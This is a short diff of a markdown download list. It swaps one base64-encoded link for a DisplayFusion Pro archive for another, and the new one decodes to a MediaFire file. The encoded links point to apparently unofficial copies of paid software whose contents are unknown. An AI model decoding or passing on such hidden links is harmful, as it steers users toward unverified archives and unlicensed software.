@@ -516,7 +516,7 @@ Download:
 ### DISPLAYFUSION
 
 Download:
-`aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOUJFOGVFQ3l5U3RGUXg3blJVNzdsNDhsRmc0cDctSTcvdmlldz91c3A9c2hhcmluZw==`
+`aHR0cHM6Ly93d3cubWVkaWFmaXJlLmNvbS9maWxlLzUyZnhhZnI0Z2t3ZTVtaC9EaXNwbGF5RnVzaW9uX1Byb185Ljd6L2ZpbGU=`
 
 **Installation steps:**
 1.  Extract the archive
